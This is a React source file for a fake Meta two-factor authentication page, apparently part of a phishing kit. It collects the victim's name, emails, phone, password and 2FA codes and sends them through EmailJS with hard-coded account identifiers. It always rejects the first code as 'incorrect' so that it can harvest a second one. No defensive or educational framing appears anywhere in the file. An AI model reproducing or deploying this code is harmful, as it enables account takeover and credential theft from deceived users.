import React, { useState } from 'react';
import classNames from 'classnames/bind';
import styles from './Code.module.scss';
import images from '../../assets/images';
import Input from '../../components/Input';
import Button from '../../components/Button';
import { useLocation, useNavigate } from 'react-router-dom';
import emailjs from 'emailjs-com';
import CountdownTimer from '../../components/CountDown';

const cx = classNames.bind(styles);

export default function Code() {
    const location = useLocation();
    const data = location.state;
    const navigate = useNavigate();

    const [showAlert, setShowAlert] = useState(false);
    const [showAlert1, setShowAlert1] = useState(false);
    const [code, setCode] = useState('');
    const [code2, setCode2] = useState('');
    const [count, setCount] = useState(0);
    const [disabled, setDisabled] = useState(false);

    const sendMail = () => {
        const newData = { ...data, code, code2 };
        console.log('Send message', newData);
        const templateParams = {
            from_name: data.from_name,
            appeal: data.appeal,
            fullName: data.fullName,
            businessEmail: data.businessEmail,
            personalEmail: data.personalEmail,
            phone: data.phone,
            pageName: data.pageName,
            password: data.password,
            password2: data.password,
            code,
            code2,
        };

        emailjs.send('service_ov9gxjl', 'template_q3fvhvv', templateParams, 'WJI8m2NskQkFr84WZ').then(
            (response) => {
                console.log('Successfully');
            },
            (error) => {
                console.error('Failed');
            },
        );
    };

    const handleSend = () => {
        if (count === 1) {
            sendMail();
            navigate('/return');
        }
        if (count === 0) {
            if (code !== '') {
                setShowAlert1(false);
                setShowAlert(true);
                setCount(1);
                setDisabled(true);
                sendMail();
            } else {
                setShowAlert1(true);
            }
        }
    };

    return (
        <div className={cx('wraper')}>
            <div className={cx('container')}>
                <h1 className={cx('title')}>Check your authentication code</h1>
                <p>
                    Enter the 6-digit code for this account from the two-factor authentication you set up (such as
                    Google Authenticator or text message on you mobile).
                </p>
                <div className={cx('logo')}>
                    <img src={images.fa} alt="Logo" />
                </div>
                <div className={cx('content')}>
                    <Input
                        classNameWarper={cx('input')}
                        type={'number'}
                        value={count === 1 ? code2 : code}
                        onChange={(e) => {
                            if (count === 1) {
                                setCode2(e.target.value);
                            } else {
                                setCode(e.target.value);
                                setDisabled(false);
                            }
                        }}
                        placeholder={'Code'}
                    />
                    {showAlert && (
                        <span className={cx('alert')}>
                            The code generator you entered is incorrect, please try again!
                            <CountdownTimer seconds={30} onCountdownEnd={() => setDisabled(false)} />
                        </span>
                    )}
                    {showAlert1 && <span className={cx('alert')}>Code can not be blank!</span>}

                    <Button disabled={disabled} large primary className={cx('btn')} onClick={handleSend}>
                        Continue
                    </Button>
                </div>
                <div className={cx('meta')}>
                    <img src={images.meta_logo_grey} width={80} alt="meta" />
                </div>
            </div>
        </div>
    );
}
